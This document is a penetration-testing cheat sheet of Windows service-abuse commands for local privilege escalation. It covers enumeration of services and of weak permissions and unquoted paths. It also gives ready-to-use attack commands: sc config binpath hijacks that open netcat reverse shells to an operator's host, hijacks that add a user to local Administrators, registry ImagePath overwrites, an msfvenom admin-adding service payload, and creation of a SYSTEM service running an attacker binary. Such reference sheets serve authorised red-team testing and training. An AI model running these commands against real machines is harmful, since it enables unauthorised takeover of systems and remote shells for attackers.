---
technique: Windows Service Abuse
category: privilege-escalation
targets: Windows Services
protocols: Local, SCM
remote_capable: false
tags: windows lpe services binpath unquoted-service-path weak-permissions accesschk
---

# Windows Service Abuse

Misconfigured Windows services can expose privilege escalation through writable service control permissions, writable binaries, writable service registry keys, unquoted service paths, or restart rights over services running as `LocalSystem`.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Service control | The user needs rights to modify or restart the target service |
| Elevated service account | The target service should run as `LocalSystem` or another privileged account |
| Writable path | Binary replacement or path hijack requires a writable file or directory |

## Windows

### List services

#cmd #services

List all services.

```cmd title:"List all services"
sc query
```
<!-- cheat -->

### Show service configuration

#cmd #services

Show service binary path, startup type, and service account.

```cmd title:"Show service configuration"
sc qc "$service_name"
```
<!-- cheat
var service_name
-->

### Check service permissions

#cmd #accesschk

Check the current user's rights over a specific service.

```cmd title:"Check current user's service rights"
accesschk.exe -ucqv "$service_name"
```
<!-- cheat
var service_name
-->

### Find writable services for current user

#cmd #accesschk

Find services the current user can modify.

```cmd title:"Find services writable by current user"
accesschk.exe -uwcqv %USERNAME% * /accepteula
```
<!-- cheat -->

### Find unquoted service paths

#cmd #unquoted-service-path

Find auto-start services with unquoted paths outside `C:\Windows`.

```cmd title:"Find unquoted auto-start service paths"
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```
<!-- cheat -->

### Find unquoted service paths with PowerUp

#powershell #powerup

Find unquoted service paths through PowerUp.

```powershell title:"Find unquoted service paths with PowerUp"
Get-ServiceUnquoted -Verbose
```
<!-- cheat -->

### Reconfigure service binary path

#cmd #service-control

Set the target service binary path to an operator command.

```cmd title:"Set service binary path"
sc config "$service_name" binpath= "$command"
```
<!-- cheat
var service_name
var command
-->

### Reconfigure service account to LocalSystem

#cmd #service-control

Set the service to run as `LocalSystem`.

```cmd title:"Set service account to LocalSystem"
sc config "$service_name" obj= ".\LocalSystem" password= ""
```
<!-- cheat
var service_name
-->

### Start service

#cmd #service-control

Start the target service after changing its configuration.

```cmd title:"Start Windows service"
net start "$service_name"
```
<!-- cheat
var service_name
-->

### Overwrite service ImagePath

#cmd #registry

Overwrite a service `ImagePath` value directly in the registry.

```cmd title:"Overwrite service ImagePath registry value"
reg add HKLM\SYSTEM\CurrentControlSet\Services\$service_name /v ImagePath /t REG_EXPAND_SZ /d "$binary_path" /f
```
<!-- cheat
var service_name
var binary_path
-->

## Linux

No Linux operator command is included here. This note covers local Windows service abuse commands.

## Additional Service Abuse Commands

## Services

### list (sc)

```cmd title:"List all services via sc query"
sc query
```
<!-- cheat -->

### list (powershell)

```powershell title:"List all services via Get-Service"
Get-Service
```
<!-- cheat -->

### service config

```cmd title:"Show service binary path, account, and dependencies"
sc qc $service
```
<!-- cheat
var service
-->

### service rights (specific)

```cmd title:"Check current user's rights on a specific service"
accesschk.exe -ucqv $service
```
<!-- cheat
var service
-->

### writable services (Authenticated Users)

```cmd title:"Find services Authenticated Users can modify"
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
<!-- cheat -->

### writable services (current user)

```cmd title:"Find services current user can modify"
accesschk.exe -uwcqv %USERNAME% * /accepteula
```
<!-- cheat -->

### writable services (BUILTIN\Users)

```cmd title:"Find services BUILTIN\Users group can modify"
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```
<!-- cheat -->

### enable a service

```cmd title:"Set start type to demand on a disabled service"
sc config $service start= demand
```
<!-- cheat
var service
-->

### service runs as LocalSystem

```cmd title:"Reconfigure service to run as LocalSystem with empty password"
sc config $service obj= ".\LocalSystem" password= ""
```
<!-- cheat
var service
-->

### service auto-start

```cmd title:"Set a service to start automatically at boot"
sc.exe config $service start= auto
```
<!-- cheat
var service
-->

### binPath hijack (nc reverse shell)

```cmd title:"Hijack service binPath to launch nc reverse shell"
sc config $service binpath= "C:\nc.exe -nv $lhost $lport -e C:\WINDOWS\System32\cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var service
-->

### binPath hijack (add admin)

```cmd title:"Hijack service binPath to add user to local Administrators"
sc config $service binpath= "net localgroup administrators $user /add"
```
<!-- cheat
var service
var user
-->

### binPath hijack (cmd /c reverse)

```cmd title:"Hijack service binPath to run cmd /c with nc reverse shell"
sc config $service binpath= "cmd /c C:\Users\nc.exe $lhost $lport -e cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var service
-->

### restart (wmic)

```cmd title:"Restart a service via WMIC StartService method"
wmic service $service call startservice
```
<!-- cheat
var service
-->

### restart (net)

```cmd title:"Stop and start a service via net commands"
net stop $service && net start $service
```
<!-- cheat
var service
-->

### weak service binary perms

```cmd title:"Find services whose binary has weak file ACLs"
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
<!-- cheat -->

### service registry write check

```cmd title:"Test write access to every service registry key via reg save/restore"
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
```
<!-- cheat -->

### list ImagePaths

```cmd title:"Dump every service's ImagePath registry value"
reg query hklm\System\CurrentControlSet\Services /s /v imagepath
```
<!-- cheat -->

### service registry ACLs

```powershell title:"Check ACLs on service registry keys for writable principals"
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "$user Users Path Everyone"
```
<!-- cheat
var user
-->

### overwrite ImagePath (reg add)

```cmd title:"Overwrite a service's ImagePath via reg add"
reg add HKLM\SYSTEM\CurrentControlSet\services\$service /v ImagePath /t REG_EXPAND_SZ /d $binary_path /f
```
<!-- cheat
var service
var binary_path
-->

### unquoted paths (cmd, auto)

```cmd title:"Find auto-start services with unquoted paths outside C:\Windows"
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```
<!-- cheat -->

### unquoted paths (cmd, any)

```cmd title:"Find any-start-type services with unquoted paths outside C:\Windows\system32"
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'
```
<!-- cheat -->

### unquoted paths (PowerUp)

```powershell title:"Find unquoted service paths via PowerUp Get-ServiceUnquoted"
Get-ServiceUnquoted -Verbose
```
<!-- cheat -->

### unquoted paths (powershell WMI)

```powershell title:"Find unquoted auto-start services via Get-WmiObject"
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
<!-- cheat -->

### service exe payload

```cmd title:"Generate service-format adduser exe payload via msfvenom"
msfvenom -p windows/exec CMD="net localgroup administrators $user /add" -f exe-service -o service.exe
```
<!-- cheat
var user
-->


## High Integrity to SYSTEM Service Creation

## From High Integrity to System

### create SYSTEM service

```cmd title:"Create a SYSTEM service pointing at attacker-controlled binary"
sc create $service binPath= "$binary_path"
```
<!-- cheat
var service
var binary_path
-->

### start SYSTEM service

```cmd title:"Start the freshly-created SYSTEM service"
sc start $service
```
<!-- cheat
var service
-->
